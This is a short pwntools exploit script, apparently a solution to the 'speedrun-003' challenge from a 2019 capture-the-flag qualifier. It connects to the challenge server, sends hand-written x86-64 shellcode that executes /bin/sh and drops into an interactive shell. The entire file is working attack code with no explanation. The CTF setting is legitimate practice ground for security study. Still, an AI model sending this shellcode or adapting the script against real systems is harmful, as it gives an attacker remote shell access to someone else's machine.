from pwn import *

# r = process('./speedrun-003', env={'DEBUG': ''})
r = remote('speedrun-003.quals2019.oooverflow.io', 31337)

shellcode = '\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x99\x52\x50\x48\x89\xe7\x31\xf6\x8d\x42\x3b\x0f\x05\x01\x01\x01\x01\x01\x01\x25'

r.sendlineafter('Send me your drift\n', shellcode)

r.interactive()
